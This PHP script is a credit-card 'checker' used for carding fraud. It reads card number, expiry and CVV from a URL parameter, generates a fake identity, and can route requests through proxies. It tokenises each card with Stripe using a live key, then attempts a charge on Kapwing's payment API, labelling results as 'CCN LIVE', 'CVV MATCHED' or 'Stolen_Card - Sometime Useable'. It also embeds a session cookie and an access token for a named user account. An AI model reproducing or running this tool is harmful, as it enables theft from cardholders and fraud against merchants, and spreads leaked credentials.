<?php

///////////////BASE BY Soham////////////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function Sohamproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = Sohamproxies();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[1st Req]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); uncomment to use proxy.txt
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
   ));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'+'.$lastname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=6a065313-8528-4b9a-945b-d5f2607509e40eccf3&sid=1145f071-dedd-4489-98be-d63b4bc1624addc500&payment_user_agent=stripe.js%2F77ea1694%3B+stripe-js-v3%2F77ea1694&time_on_page=33369&referrer=https%3A%2F%2Fwww.kapwing.com%2F&key=pk_live_2sDMAtDohnudYHgRDvCSQelo&pasted_fields=number');

$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

 $ch = curl_init();

//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); Uncomment to use proxy.txt
 curl_setopt($ch, CURLOPT_URL, 'https://www.kapwing.com/api/v1/payment/chargeAnnual');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.kapwing.com',
'method: POST',
'path: /api/v1/payment/chargeAnnual',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: __cfduid=d4c7e4cfc9676be23d8353860f18496341601451629; _ga=GA1.2.1854724578.1601496634; _gid=GA1.2.1659641305.1601496634; G_ENABLED_IDPS=google; _fbp=fb.1.1601496635853.993877570; __stripe_mid=6a065313-8528-4b9a-945b-d5f2607509e40eccf3; __stripe_sid=1145f071-dedd-4489-98be-d63b4bc1624addc500; amplitude_id_e3eca64f2da6246ee6a22cd63f455a07kapwing.com=eyJkZXZpY2VJZCI6ImNiNzMwZmQxLTNiYzktNGI3Zi04M2E5LTk1YTA4Mjk0MGVjMFIiLCJ1c2VySWQiOiI1Zjc0MzZhYmM2OTBmMzAwOGIxOTE2NzUiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE2MDE0OTY2MzMyNTEsImxhc3RFdmVudFRpbWUiOjE2MDE0OTc2MDg3MTcsImV2ZW50SWQiOjEsImlkZW50aWZ5SWQiOjEsInNlcXVlbmNlTnVtYmVyIjoyfQ==; _gat=1',
'origin: https://www.kapwing.com',
'referer: https://www.kapwing.com/upgrade/subscribe/pricing',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1Zjc0MzZhYmM2OTBmMzAwOGIxOTE2NzUiLCJhY2NvdW50VHlwZSI6MCwiZGVmYXVsdFByaXZhY3kiOjAsIm5hbWUiOiJTb2hhbSBOYXZhbGUiLCJlbWFpbCI6InNvaGFtbmF2YWxlMTdAZ21haWwuY29tIiwicGljdHVyZSI6Imh0dHBzOi8vbGg2Lmdvb2dsZXVzZXJjb250ZW50LmNvbS8tZ0VwdUlNazhkbTgvQUFBQUFBQUFBQUkvQUFBQUFBQUFBQUEvQU1adXVjbFBnZEhVNE05a3hvMnFvVEV3U3MweFp6b3R3US9zOTYtYy9waG90by5qcGciLCJmaXJzdE5hbWUiOiJTb2hhbSIsImxhc3ROYW1lIjoiTmF2YWxlIiwibG9jYWwiOiJlbi1HQiIsImxvZ2dlZEluV2l0aCI6Imdvb2dsZSIsImNyZWF0ZWRBdCI6IjIwMjAtMDktMzBUMDc6NDE6MzEuMjQyWiIsImxhc3RTaWduSW4iOiIyMDIwLTA5LTMwVDA3OjQxOjMxLjI0MloiLCJpYXQiOjE2MDE0NTI2MTAsImV4cCI6MTYzMjk4ODYxMH0.ke0AERjVSXJhH4vx48UJThMlcD6zj7LiXOfmCquaANM',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"stripeToken":{"id":"'.$token.'","object":"token","card":{"id":"card_1HX0BqBOdcyYQUaFFOUoHkjZ","object":"card","address_city":null,"address_country":null,"address_line1":null,"address_line1_check":null,"address_line2":null,"address_state":null,"address_zip":null,"address_zip_check":null,"brand":"MasterCard","country":"TN","cvc_check":"unchecked","dynamic_last4":null,"exp_month":3,"exp_year":2022,"funding":"credit","last4":"0661","name":"fddnfcdh hedfueh","tokenization_method":null},"client_ip":"157.33.150.100","created":1601452650,"livemode":true,"type":"card","used":false},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1Zjc0MzZhYmM2OTBmMzAwOGIxOTE2NzUiLCJhY2NvdW50VHlwZSI6MCwiZGVmYXVsdFByaXZhY3kiOjAsIm5hbWUiOiJTb2hhbSBOYXZhbGUiLCJlbWFpbCI6InNvaGFtbmF2YWxlMTdAZ21haWwuY29tIiwicGljdHVyZSI6Imh0dHBzOi8vbGg2Lmdvb2dsZXVzZXJjb250ZW50LmNvbS8tZ0VwdUlNazhkbTgvQUFBQUFBQUFBQUkvQUFBQUFBQUFBQUEvQU1adXVjbFBnZEhVNE05a3hvMnFvVEV3U3MweFp6b3R3US9zOTYtYy9waG90by5qcGciLCJmaXJzdE5hbWUiOiJTb2hhbSIsImxhc3ROYW1lIjoiTmF2YWxlIiwibG9jYWwiOiJlbi1HQiIsImxvZ2dlZEluV2l0aCI6Imdvb2dsZSIsImNyZWF0ZWRBdCI6IjIwMjAtMDktMzBUMDc6NDE6MzEuMjQyWiIsImxhc3RTaWduSW4iOiIyMDIwLTA5LTMwVDA3OjQxOjMxLjI0MloiLCJpYXQiOjE2MDE0NTI2MTAsImV4cCI6MTYzMjk4ODYxMH0.ke0AERjVSXJhH4vx48UJThMlcD6zj7LiXOfmCquaANM","userId":"5f7436abc690f3008b191675","workspaceId":"5f7436ac7705a20042e7a8e2"}');

 $result = curl_exec($ch);
 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED Soham ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED Soham ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHEDSoham </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE Soham</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE Soham/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE Soham </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE Soham♛ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED - Incorrect Zip Soham♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Stolen_Card - Sometime Useable Soham ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Lost_Card - Sometime Useable Soham♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Insufficient Funds Soham♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Expired Soham♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Pickup Card_Card - Sometime Useable Soham ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number Soham ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number Soham♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Declined Soham ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Generic_Decline Soham♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Do_Not_Honor Soham ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Unchecked [Proxy Dead] Soham ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Fail Soham♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Expired Card Soham ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Doesnt Support This Purchase Soham ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Proxy Dead / Error Not Listed Soham ♛</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response

//echo $token; to check if token captured or not 

///////////////////////////////////////////////====== By Soham===============\\\\\\\\\\\\\\\[Used Reboot13 Raw Base ]
?>
